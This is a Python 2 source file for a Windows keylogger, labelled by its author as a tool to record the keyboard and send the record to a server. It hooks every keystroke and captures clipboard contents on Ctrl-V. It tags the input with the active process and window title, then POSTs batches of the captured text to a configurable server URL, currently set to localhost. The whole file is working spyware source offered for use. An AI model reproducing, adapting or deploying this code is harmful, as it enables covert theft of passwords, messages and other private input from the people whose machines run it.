# -*- coding=utf-8 -*-
# Author: Conan
# Email:1526840124@qq.com
# Description: A tool to record keyboard and send the record to server
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import urllib
import urllib2

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None


def get_current_process():
    # 获取前台窗口的句柄
    hwnd = user32.GetForegroundWindow()
    # 获取前台 窗口的进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value
    # 申请内存
    executable = create_string_buffer("\x00" * 512)
    # 打开进程获取进程句柄
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    # 读取窗口标题
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
    # 关闭进程和句柄
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    # 返回进程相关消息
    process_result = "[PID: %s - %s -%s]" % (process_id, executable.value, window_title)
    print process_result
    return process_result


def send_result(data):
    url = "http://127.0.0.1:8080"
    encode_data = urllib.urlencode(data)
    req = urllib2.Request(url, encode_data)
    response = urllib2.urlopen(req)
    if response.getcode() == 200:
        return True
    else:
        return False



key_result = ""
process_result=""


def KeyStroke(event):
    global current_window
    global key_result
    global process_result
    # 判断窗口是否改变
    if event.WindowName != current_window:
        current_window = event.WindowName
        # 获取新窗口进程相关信息
        process_result = get_current_process()
    # 判断按键类型
    if event.Ascii > 32 and event.Ascii < 127:
        # 为常见字母键
        key_result += chr(event.Ascii)
    else:
        # 为Ctrl-V
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            pasted_result = "[PASTE] - %s" % (pasted_value)
            key_result += pasted_result
        else:
            key_result += event.Key
    # print key_result
    # 将进程信息和按键信息发送到服务器
    if ((len(process_result) + len(key_result)) > 100):
        print "sending the data"
        send_data = {
            "process_info": process_result,
            "key_info": key_result,
        }
        key_result = ""
        if send_result(send_data)==False:
            print "Server not found"
    # 返回直到下一钩子事件触发
    return True


# 创建和注册钩子函数管理哭器
k1 = pyHook.HookManager()
k1.KeyDown = KeyStroke
# 注册键盘记录的钩子，并永久运行
k1.HookKeyboard()

pythoncom.PumpMessages()
